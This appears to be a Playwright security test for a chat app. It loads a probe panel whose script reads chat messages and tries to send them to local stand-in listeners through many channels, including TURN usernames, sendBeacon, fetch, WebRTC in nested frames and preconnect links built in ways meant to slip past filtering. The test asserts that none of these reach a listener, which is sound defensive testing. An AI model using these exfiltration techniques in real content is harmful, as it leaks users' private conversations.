// A panel whose scripts run with the internet off sends nothing anywhere (spec/HTML-MESSAGES.md
// §3.4, "no network unless the user allows it"), by the channels the frame page's
// `connect-src 'none'` doesn't govern as well as those it does. Before the bootstrap's walls
// (ARCHITECTURE §12, "panel scripts and the bridge"), STUN and TURN over UDP and TCP (with the
// chat's text as TURN's user name), a srcdoc frame's own RTCPeerConnection, and preconnect
// hints, in the block and from script, all reached their listeners here. Tried: WebRTC (by
// address and by name, prefixed too); nested frames (about:blank, srcdoc, srcdoc in markup, a
// custom element built on a frame, a document whose root is one); a preconnect link made every
// way (each way to set `rel`, every HTML sink, an inert document, XML with a prefix, editing,
// an SVG `<style>`, document.write whole and cut in two); DNS prefetch, speculation rules, a
// hovered link; and the policy's own (prefetch, preload, sendBeacon, fetchLater, EventSource,
// a socket, WebTransport, fetch, a worker, a ping, attributionsrc, images, fonts, media, CSS
// `url()`, a stylesheet). Each aims at its own local TCP and UDP listener, by address or by a
// `*.probe.test` name the browser maps there; the browser's net log shows every name it tried
// to resolve. Controls show the listeners and the log see what they're meant to: STUN, a
// connection and a name on a plain page, a preconnect on the app's. Chromium only, in a
// browser of its own for the launch flags and network prediction. Synthetic data only.
import { createSocket, type Socket } from "node:dgram"
import { mkdirSync, readFileSync, writeFileSync } from "node:fs"
import { createServer, type Server } from "node:net"
import { join } from "node:path"
import { chromium, expect, test } from "@playwright/test"
import type { EntityId } from "@dreamspan/shared/chat.ts"
import type { RefId } from "@dreamspan/shared/library.ts"
import { asUser } from "./support/rpc.ts"
import { ADMIN, apiLogin, serverPerFile, withAdmin } from "./support/server.ts"

const server = serverPerFile(withAdmin)

/** What reached one channel's listener: "tcp" for a connection, "udp" for a datagram. */
interface Listener {
  readonly port: number
  readonly hits: Array<string>
  readonly close: () => Promise<void>
}

/** A TCP server and a UDP socket on one free loopback port. */
const listen = async (): Promise<Listener> => {
  for (;;) {
    const hits: Array<string> = []
    const tcp: Server = createServer((socket) => {
      hits.push("tcp")
      socket.on("error", () => {})
      socket.destroy()
    })
    await new Promise<void>((done) => tcp.listen(0, "127.0.0.1", done))
    const port = (tcp.address() as { port: number }).port
    const udp: Socket = createSocket("udp4")
    const bound = await new Promise<boolean>((done) => {
      udp.once("error", () => done(false))
      udp.bind(port, "127.0.0.1", () => done(true))
    })
    if (!bound) {
      tcp.close()
      udp.close()
      continue
    }
    udp.on("message", () => hits.push("udp"))
    return {
      port,
      hits,
      close: () =>
        new Promise<void>((done) => {
          udp.close()
          tcp.close(() => done())
        })
    }
  }
}

/** The channels the panel tries, each with its own listener. */
const CHANNELS = [
  // WebRTC, from the panel's window.
  "stun",
  "turnUdp",
  "turnTcp",
  "stunName",
  // WebRTC from a nested frame's realm, however it's made.
  "nested",
  // Network hints, in the block and from script, by every way to set a link's rel or make one.
  "dnsPrefetch",
  "preconnect",
  "preconnectProperty",
  "preconnectAttribute",
  "preconnectRelList",
  "preconnectRelListValue",
  "preconnectAttrNode",
  "preconnectNamedItem",
  "preconnectAttrValue",
  "preconnectInner",
  "preconnectAdjacent",
  "preconnectInertDocument",
  "preconnectParser",
  "preconnectXml",
  "preconnectEdit",
  "preconnectSvg",
  "preconnectWrite",
  "preconnectWriteSplit",
  "speculation",
  "anchor",
  // The policy's own: prefetch and preload, beacons, sockets, workers, a ping, subresources.
  "prefetch",
  "preload",
  "beacon",
  "fetchLater",
  "eventSource",
  "socket",
  "webTransport",
  "fetch",
  "worker",
  "ping",
  "attribution",
  "image",
  "font",
  "media",
  "cssUrl",
  "stylesheet"
] as const
type Channel = (typeof CHANNELS)[number]

/** The panel: every channel at once, each in its own `try`, its outcome in `#results`. */
const probePanel = (ports: Record<Channel, number>) => {
  const at = (channel: Channel) => `127.0.0.1:${ports[channel]}`
  const named = (channel: Channel) => `${channel.toLowerCase()}.probe.test:${ports[channel]}`
  /** A script line: `run` (an expression or block body) as the attempt called `name`. */
  const attempt = (name: string, run: string) => `  await attempt('${name}', async () => { ${run} })`
  /** A preconnect link's markup for a channel. */
  const hint = (channel: Channel) => `<link rel="preconnect" href="http://${named(channel)}/">`
  /**
   * The same as a script expression, never whole in the script's text: the bootstrap takes
   * hints out of the block's text, scripts' included, and these are for the script to make.
   */
  const hintJs = (channel: Channel) => `('<' + '${hint(channel).slice(1)}')`
  return [
    "The probe board.",
    "",
    "```html",
    "<!doctype html>",
    "<html><head>",
    // Written in the block itself: these need no script.
    `<link rel="dns-prefetch" href="//dnsprefetch.probe.test">`,
    hint("preconnect"),
    `<link rel="prefetch" href="http://${at("prefetch")}/p">`,
    `<link rel="preload" as="image" href="http://${at("preload")}/p.png">`,
    `<link rel="stylesheet" href="http://${at("stylesheet")}/s.css">`,
    `<script type="speculationrules">{"prefetch": [{"source": "list", "urls": ["http://${named("speculation")}/s"]}]}</script>`,
    "<style>",
    `@font-face { font-family: probe; src: url(http://${at("font")}/f.woff2) }`,
    `#styled { font-family: probe; background: url(http://${at("cssUrl")}/b.png) }`,
    "</style>",
    // document.write while the block is read: a whole hint, and one cut in two.
    "<script>",
    "window.writes = {}",
    `try { document.write(${hintJs("preconnectWrite")}); writes.whole = 'written' } catch (error) { writes.whole = 'threw ' + error.name }`,
    `try { document.write('<' + 'link rel=\\x22preconnect\\x22 href=\\x22http://${named("preconnectWriteSplit")}/'); writes.split = 'written' } catch (error) { writes.split = 'threw ' + error.name }`,
    "try { document.write('\\x22>') } catch {}",
    `try { document.write('<lin'); document.write('k rel=\\x22preconnect\\x22 href=\\x22http://${named("preconnectWriteSplit")}/\\x22>') } catch (error) { writes.split2 = 'threw ' + error.name }`,
    "</script>",
    "</head><body>",
    '<div id="styled">Probe</div>',
    `<img src="http://${at("image")}/i.png" alt="" attributionsrc="http://${at("attribution")}/r">`,
    `<audio src="http://${at("media")}/a.mp3" preload="auto"></audio>`,
    `<a id="ping" href="#here" ping="http://${at("ping")}/ping">Ping</a>`,
    `<a id="anchor" href="http://${named("anchor")}/a">A link to hover</a>`,
    '<div id="editable" contenteditable="true">Edit</div>',
    '<pre id="results"></pre>',
    // A nested frame's own script, as text.
    '<script type="text/plain" id="nestedScript">',
    "try {",
    `  const peer = new RTCPeerConnection({ iceServers: [{ urls: 'stun:${at("nested")}' }] })`,
    "  peer.createDataChannel('x')",
    "  peer.createOffer().then((offer) => peer.setLocalDescription(offer))",
    // Any origin: written as an escape, as the display transforms take a starred quote for emphasis.
    "  parent.postMessage('nested ran', '\\x2a')",
    "} catch (error) { parent.postMessage('nested threw ' + error.name, '\\x2a') }",
    "</script>",
    "<script>",
    "(async () => {",
    "  const r = { writes }",
    "  const results = document.getElementById('results')",
    "  const attempt = async (name, run) => {",
    "    try { r[name] = String(await Promise.race([run(), new Promise((resolve) => setTimeout(() => resolve('pending'), 4000))])) }",
    "    catch (error) { r[name] = 'threw ' + (error && error.name) }",
    "    results.textContent = JSON.stringify(r)",
    "  }",
    "  const offer = async (Peer, iceServers) => {",
    "    const peer = new Peer({ iceServers, iceTransportPolicy: 'all' })",
    "    peer.createDataChannel('probe')",
    "    await peer.setLocalDescription(await peer.createOffer())",
    "    return 'gathering'",
    "  }",
    "  const nestedHtml = '<script>' + document.getElementById('nestedScript').textContent + '<' + '/script>'",
    "  let nestedAnswers = []",
    "  addEventListener('message', (event) => { if (typeof event.data === 'string' && event.data.startsWith('nested')) nestedAnswers.push(event.data) })",
    "  const link = () => document.createElement('link')",
    "  const secret = encodeURIComponent(JSON.stringify(getChatMessages('0-99').map((m) => m.message)).slice(0, 200))",
    "  r.constructors = [typeof RTCPeerConnection, typeof webkitRTCPeerConnection, typeof RTCDataChannel].join(',')",
    attempt("stun", `return offer(RTCPeerConnection, [{ urls: 'stun:${at("stun")}' }])`),
    attempt(
      "turnUdp",
      `return offer(RTCPeerConnection, [{ urls: 'turn:${at("turnUdp")}', username: secret, credential: 'x' }])`
    ),
    attempt(
      "turnTcp",
      `return offer(RTCPeerConnection, [{ urls: 'turn:${at("turnTcp")}?transport=tcp', username: secret, credential: 'x' }])`
    ),
    attempt("stunName", `return offer(RTCPeerConnection, [{ urls: 'stun:${named("stunName")}' }])`),
    attempt("webkitStun", `return offer(webkitRTCPeerConnection, [{ urls: 'stun:${at("stun")}' }])`),
    // Nested frames: about:blank, srcdoc, srcdoc in markup, a custom element built on one, a document whose root is one.
    attempt(
      "nestedBlank",
      `const frame = document.createElement('iframe'); document.body.append(frame); return offer(frame.contentWindow.RTCPeerConnection, [{ urls: 'stun:${at("nested")}' }])`
    ),
    attempt(
      "nestedIndex",
      `document.body.append(document.createElement('iframe')); return offer(window[window.length - 1].RTCPeerConnection, [{ urls: 'stun:${at("nested")}' }])`
    ),
    attempt(
      "nestedSrcdoc",
      "const frame = document.createElement('iframe'); frame.srcdoc = nestedHtml; document.body.append(frame); return 'appended'"
    ),
    attempt(
      "nestedMarkup",
      "const holder = document.createElement('div'); holder.innerHTML = '<' + 'iframe srcdoc=\\x22' + nestedHtml.replace(/&/g, '&amp;').replace(/\\x22/g, '&quot;') + '\\x22></iframe>'; document.body.append(holder); return holder.children.length"
    ),
    attempt(
      "nestedCustom",
      "class Framed extends HTMLIFrameElement {}; customElements.define('probe-frame', Framed, { extends: 'iframe' }); const frame = new Framed(); frame.srcdoc = nestedHtml; document.body.append(frame); return 'appended'"
    ),
    attempt(
      "nestedRoot",
      "const frame = document.implementation.createDocument('http://www.w3.org/1999/xhtml', 'iframe').documentElement; frame.srcdoc = nestedHtml; document.body.append(document.adoptNode(frame)); return String(frame.constructor.name)"
    ),
    // Preconnect hints, made every way.
    attempt(
      "preconnectProperty",
      `const l = link(); l.rel = 'preconnect'; l.href = 'http://${named("preconnectProperty")}/'; document.head.append(l); return l.rel`
    ),
    attempt(
      "preconnectAttribute",
      `const l = link(); l.setAttribute('REL', 'preconnect'); l.href = 'http://${named("preconnectAttribute")}/'; document.head.append(l); return l.rel`
    ),
    attempt(
      "preconnectRelList",
      `const l = link(); l.relList.add('preconnect'); l.href = 'http://${named("preconnectRelList")}/'; document.head.append(l); return l.rel`
    ),
    attempt(
      "preconnectRelListValue",
      `const l = link(); l.href = 'http://${named("preconnectRelListValue")}/'; document.head.append(l); l.relList = 'preconnect'; l.relList.value = 'preconnect'; l.relList.toggle('preconnect'); l.relList.replace('x', 'preconnect'); return l.rel`
    ),
    attempt(
      "preconnectAttrNode",
      `const l = link(); const a = document.createAttribute('rel'); a.value = 'preconnect'; l.setAttributeNode(a); l.href = 'http://${named("preconnectAttrNode")}/'; document.head.append(l); return l.rel`
    ),
    attempt(
      "preconnectNamedItem",
      `const l = link(); const a = document.createAttribute('rel'); a.value = 'preconnect'; l.attributes.setNamedItem(a); l.href = 'http://${named("preconnectNamedItem")}/'; document.head.append(l); return l.rel`
    ),
    attempt(
      "preconnectAttrValue",
      `const l = link(); l.setAttribute('rel', 'stylesheet'); l.href = 'http://${named("preconnectAttrValue")}/'; document.head.append(l); const a = l.getAttributeNode('rel'); a.value = 'preconnect'; a.nodeValue = 'preconnect'; a.textContent = 'preconnect'; return l.rel`
    ),
    attempt(
      "preconnectInner",
      `const d = document.createElement('div'); d.innerHTML = ${hintJs("preconnectInner")}; document.body.append(d); return d.innerHTML.length`
    ),
    attempt(
      "preconnectAdjacent",
      `document.body.insertAdjacentHTML('beforeend', ${hintJs("preconnectAdjacent")}); return 'inserted'`
    ),
    attempt(
      "preconnectInertDocument",
      `const doc = document.implementation.createHTMLDocument(''); doc.body.innerHTML = ${hintJs("preconnectInertDocument")}; const l = doc.querySelector('link'); if (l) document.head.append(document.adoptNode(l)); return String(!!l)`
    ),
    attempt(
      "preconnectParser",
      `const doc = new DOMParser().parseFromString(${hintJs("preconnectParser")}, 'text/html'); const l = doc.querySelector('link'); if (l) document.head.append(document.adoptNode(l)); return String(!!l)`
    ),
    attempt(
      "preconnectXml",
      `const doc = new DOMParser().parseFromString('<' + 'x:link xmlns:x="http://www.w3.org/1999/xhtml" rel="preconnect" href="http://${named("preconnectXml")}/"/>', 'application/xml'); document.head.append(document.importNode(doc.documentElement, true)); return doc.documentElement.constructor.name`
    ),
    attempt(
      "preconnectEdit",
      `const e = document.getElementById('editable'); e.focus(); document.execCommand('insertHTML', false, ${hintJs("preconnectEdit")}); return e.innerHTML.length`
    ),
    attempt(
      "preconnectSvg",
      `const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg'); document.body.append(svg); svg.innerHTML = '<style><p>' + ${hintJs("preconnectSvg")} + '</p></style>'; return document.querySelectorAll('link[rel=preconnect]').length`
    ),
    attempt(
      "speculationScripted",
      `const s = document.createElement('script'); s.type = 'speculationrules'; s.textContent = JSON.stringify({ prefetch: [{ source: 'list', urls: ['http://${named("speculation")}/t'] }] }); document.head.append(s); return 'added'`
    ),
    attempt("beacon", `return navigator.sendBeacon('http://${at("beacon")}/b', secret)`),
    attempt(
      "fetchLater",
      `fetchLater('http://${at("fetchLater")}/l?' + secret, { activateAfter: 0 }); return 'queued'`
    ),
    attempt("eventSource", `new EventSource('http://${at("eventSource")}/e'); return 'opened'`),
    attempt("socket", `new WebSocket('ws://${at("socket")}/w'); return 'opened'`),
    attempt(
      "webTransport",
      `new WebTransport('https://${at("webTransport")}/t').ready.catch(() => {}); return 'opened'`
    ),
    attempt(
      "fetch",
      `return fetch('http://${at("fetch")}/f?' + secret, { mode: 'no-cors', keepalive: true }).then(() => 'reached')`
    ),
    attempt(
      "worker",
      `new Worker(URL.createObjectURL(new Blob(["fetch('http://${at("worker")}/w')"], { type: 'text/javascript' }))); return 'started'`
    ),
    attempt("ping", "document.getElementById('ping').click(); return 'clicked'"),
    "  await new Promise((resolve) => setTimeout(resolve, 1500))",
    "  r.nestedAnswers = nestedAnswers.join(',')",
    "  r.frames = window.length",
    "  results.textContent = JSON.stringify(r)",
    "  document.body.dataset.ran = 'yes'",
    "})()",
    "</script></body></html>",
    "```"
  ].join("\n")
}

/** Every host name the browser's net log shows it resolving (or trying to). */
const resolvedNames = (log: string) => [...new Set(log.match(/[a-z0-9.-]+\.probe\.test/gi) ?? [])].sort()

test("a panel with scripts and the internet off reaches no other host, by any channel", async ({
  browserName
}, info) => {
  test.skip(browserName !== "chromium", "launch flags and the net log are Chromium's")
  test.setTimeout(180_000)
  const listeners = Object.fromEntries(
    await Promise.all(CHANNELS.map(async (channel) => [channel, await listen()] as const))
  ) as Record<Channel, Listener>
  const control = await listen()
  const preControl = await listen()
  const ports = Object.fromEntries(CHANNELS.map((channel) => [channel, listeners[channel].port])) as Record<
    Channel,
    number
  >
  const dir = info.outputPath("browser")
  mkdirSync(join(dir, "profile", "Default"), { recursive: true })
  // Network prediction on, as in a desktop browser by default, so DNS prefetch and preconnect happen.
  writeFileSync(
    join(dir, "profile", "Default", "Preferences"),
    JSON.stringify({ net: { network_prediction_options: 0 } })
  )
  const netLog = join(dir, "net.json")
  // The full Chromium build (the headless shell has no network prediction), with its own profile.
  const context = await chromium.launchPersistentContext(join(dir, "profile"), {
    channel: "chromium",
    // Straight to the listeners, whatever proxy the host's environment names.
    env: Object.fromEntries(Object.entries(process.env).filter(([key]) => !/proxy/i.test(key))),
    args: [
      `--log-net-log=${netLog}`,
      "--net-log-capture-mode=Everything",
      "--no-proxy-server",
      // No name leaves this machine: every probe name is the loopback address, the rest unresolvable.
      "--host-resolver-rules=MAP *.probe.test 127.0.0.1, MAP * ~NOTFOUND, EXCLUDE 127.0.0.1"
    ]
  })
  let results: Record<string, unknown> = {}
  try {
    const page = await context.newPage()

    // The control, on a plain page: STUN, a connection and a name all reach their listener and the log.
    const plain = await context.newPage()
    await plain.goto("about:blank")
    await plain.evaluate(async (port) => {
      const peer = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${port}` }] })
      peer.createDataChannel("control")
      await peer.setLocalDescription(await peer.createOffer())
    }, control.port)
    await plain.goto(`http://control.probe.test:${control.port}/c`).catch(() => {})
    await expect.poll(() => [...new Set(control.hits)].sort()).toEqual(["tcp", "udp"])
    await plain.close()

    await apiLogin(page.request, server(), ADMIN.handle, ADMIN.password)
    // The control on the app's own page: a preconnect reaches the log and the listener. (A DNS
    // prefetch shows nowhere even there, in this build; the walls take its link out as they do
    // preconnect's.)
    await page.goto(`${server().url}/chats`)
    await page.evaluate((port) => {
      const link = document.createElement("link")
      link.rel = "preconnect"
      link.href = `http://control-pre.probe.test:${port}`
      document.head.append(link)
    }, preControl.port)
    await expect.poll(() => preControl.hits).toContain("tcp")
    const name = "Probe Board"
    const imported = await page.request.post(`${server().url}/library/import?name=fixture.json`, {
      data: Buffer.from(
        JSON.stringify({
          spec: "chara_card_v3",
          spec_version: "3.0",
          data: { name, first_mes: probePanel(ports) }
        })
      ),
      headers: { origin: server().url, "content-type": "application/octet-stream" }
    })
    expect(imported.status()).toBe(200)
    const { ref } = ((await imported.json()) as { library: { ref: { id: string; entityId: string } } }).library
    await asUser(server(), ADMIN.handle, ADMIN.password, (api) =>
      api.SetHtmlApproval({ refId: ref.id as RefId, scripts: true, network: false })
    )
    const started = await asUser(server(), ADMIN.handle, ADMIN.password, (api) =>
      api.StartChat({
        cards: [ref.entityId as EntityId],
        persona: null,
        greeting: 0,
        first: { _tag: "Send", content: "A secret line.", speakerEntityId: null }
      })
    )
    await page.goto(`${server().url}/chats/${started.chat.id}`)
    const frame = page.locator('iframe[title="Panel"]')
    await expect(frame).toHaveAttribute("src", "/frame/panel?scripts=1")
    const inside = page.frameLocator('iframe[title="Panel"]')
    // The text the cut write left behind starts a body of its own, so it's the second.
    await expect(inside.locator("body[data-ran=yes]")).toHaveCount(1, { timeout: 60_000 })
    results = JSON.parse((await inside.locator("#results").textContent()) ?? "{}") as Record<string, unknown>
    // A link the pointer rests on is one a browser may connect to ahead.
    await inside.locator("#anchor").hover()
    // ICE gathering, prefetches and retries: well past the control's few hundred milliseconds.
    await page.waitForTimeout(5000)
  } finally {
    await context.close()
  }
  const reached = Object.fromEntries(
    CHANNELS.filter((channel) => listeners[channel].hits.length > 0).map((channel) => [
      channel,
      [...new Set(listeners[channel].hits)].sort().join("+")
    ])
  )
  const names = resolvedNames(readFileSync(netLog, "utf8"))
  await Promise.all([control, preControl, ...Object.values(listeners)].map((listener) => listener.close()))
  await info.attach("probe", {
    body: JSON.stringify({ results, reached, names }, null, 2),
    contentType: "application/json"
  })
  // The controls' names are in the log, so a panel's would be.
  expect(names).toEqual(expect.arrayContaining(["control.probe.test", "control-pre.probe.test"]))
  // The panel's script ran to its end, with WebRTC gone from its window, and no frame in it.
  expect(results.constructors).toBe("undefined,undefined,undefined")
  expect(results.frames).toBe(0)
  expect(results.nestedAnswers).toBe("")
  expect(reached).toEqual({})
  expect(names.filter((name) => !name.startsWith("control"))).toEqual([])
})
